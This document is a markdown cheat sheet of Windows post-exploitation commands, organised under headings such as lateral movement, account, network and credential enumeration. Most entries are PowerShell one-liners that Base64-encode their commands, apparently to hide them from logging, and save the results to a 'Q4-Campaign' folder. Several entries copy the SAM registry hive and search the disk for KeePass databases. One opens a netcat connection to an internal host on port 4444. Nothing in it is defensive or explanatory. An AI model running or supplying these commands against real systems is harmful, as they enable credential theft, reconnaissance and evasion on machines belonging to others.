## Lateral Movement:

- `nc 192.168.50.220 4444`

## Local Account Enumeration:

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'whoami'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\Current-User.txt"`

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'whoami /groups'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\Local-User-Groups.txt"`

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-LocalUser'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\Local-Users.txt"`

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-LocalGroupMember Administrators | Where-Object { $_.PrincipalSource -eq "Local" } | Select-Object Name'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\Local-Admins.txt"`

## Get Installed Applications:

### 32 Bit:

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,DisplayVersion'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\32BitPrograms.txt"`

### 64 Bit:

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname,DisplayVersion'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\64BitPrograms.txt"`

## Network Enumeration

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list -property * | findstr “Address”'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\Security-Event-4624.txt"`

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'route print'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\RoutePrint.txt"`

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'ipconfig /all'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\IpConfig.txt"`

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'netstat -ano'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\NetStat.txt"`

## Local System Enumeration

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-Process'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\Get-Process.txt"`

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Copy-Item -Path "$env:SystemRoot\System32\Config\RegBack\SAM" -Destination '.\Q4-Campaign\SAM-Copy'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand`

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'systeminfo'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\SystemInfo.txt"`

## Credential Enumeration

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-ChildItem -Path C:\ -Include \*.kdbx -File -Recurse -ErrorAction SilentlyContinue'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\Get-KeyPass-DBs.txt"`

- `$folderPath = ".\Q4-Campaign"; if (-not (Test-Path -Path $folderPath)) { New-Item -ItemType Directory -Path $folderPath }; $command = 'Get-ChildItem -Path C:\ -Include SAM -File -Recurse -ErrorAction SilentlyContinue'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encodedCommand | Out-File -FilePath ".\Q4-Campaign\Find-SAM-DB.txt"`